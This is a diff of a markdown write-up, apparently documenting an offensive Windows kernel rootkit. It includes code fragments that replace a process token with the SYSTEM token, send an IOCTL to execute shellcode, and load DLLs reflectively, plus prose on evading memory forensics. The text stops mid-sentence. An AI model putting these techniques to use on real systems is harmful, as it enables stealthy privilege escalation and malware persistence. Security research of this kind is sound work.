@@ -338,10 +338,10 @@ The PID of that process is saved, and its first thread is then caught by `OnThre
 			::PsLookupThreadByThreadId(ThreadId, &thread);
 			if (!NT_SUCCESS(QueueAPC(thread, KernelMode, [](PVOID, PVOID, PVOID)
 			{
-				auto* const process = ::PsGetCurrentProcess(); 		// Get current process (i.e. chrome.exe)
+				auto* const process = ::PsGetCurrentProcess(); 			// Get current process (i.e. chrome.exe)
 				auto* const token = ::PsReferencePrimaryToken(process); // Get the process token
-				SetTokenToSystem(process, token); 			// Replace the process token with system token
-				::ObDereferenceObject(token); 				// Dereference the process token
+				SetTokenToSystem(process, token); 						// Replace the process token with system token
+				::ObDereferenceObject(token); 							// Dereference the process token
 			
 				// Thread and Process creation notification callbacks are not needed anymore
 				::PsSetCreateProcessNotifyRoutineEx(OnProcessNotify, TRUE);
@@ -553,11 +553,11 @@ enum class ClientOpcode
 	
 	DWORD bytesReturned = 0;
 	if (!::DeviceIoControl(
-			deviceAutoHandle.get(), 						// device to be queried
-			IOCTL_SUBZERO_EXECUTE_SHELLCODE, 					// operation to perform
-			inputBuffer.get(), bufferSize, 						// input buffer
+			deviceAutoHandle.get(), 											// device to be queried
+			IOCTL_SUBZERO_EXECUTE_SHELLCODE, 									// operation to perform
+			inputBuffer.get(), bufferSize, 										// input buffer
 			outputBuffer.get(), shellcodeDataStruct->ReturnedDataMaxSize, 		// output buffer
-			&bytesReturned, 							// # bytes returned
+			&bytesReturned, 													// # bytes returned
 			nullptr))
 			throw std::runtime_error(DEBUG_TEXT("[-] DeviceIoControl Failed"));
 			
@@ -576,7 +576,16 @@ void LoadLibraryReflectively_OpcodeHandler(const PVOID Data, const size_t DataLe
 	ReflectiveLibraryLoader::OverridePeStringIdentifiers(hModule);
 }
 ```
- This class is based on [Joachim Bauch's in-memory DLL loader](https://www.joachim-bauch.de/tutorials/loading-a-dll-from-memory/) 
+ This class is based on [Joachim Bauch's in-memory DLL loader](https://www.joachim-bauch.de/tutorials/loading-a-dll-from-memory/) and as its name suggests - it provides the attacker a DLL loader that does not require an image on the file system.
+ The loading process itself works as follows:
+ 1. Allocate `RW` memory space and copy the file's sections into it.
+ 2. Parse and relocate internal pointers (if needed).
+ 3. Load any dependency libraries and update the PE's IAT.
+ 4. Change each section memory protection to its appropriate one.
+ 5. Execute TLS callbacks if exists.
+ 6. Call the library's `DllMain`.
+ 
+ Initially, I intended to use the driver to change the DLL's main allocation `VAD` protection to `EXECUTE_WRITECOPY` and link it a `FILE_OBJECT` in order to legitimate it as much as possible, but after observing a reflectively loaded library from a memory image using [Volatility Framework](https://github.com/volatilityfoundation/volatility), which is today the main tool for memory forensics (and the one my colleagues uses)
  
 ## Loader
   
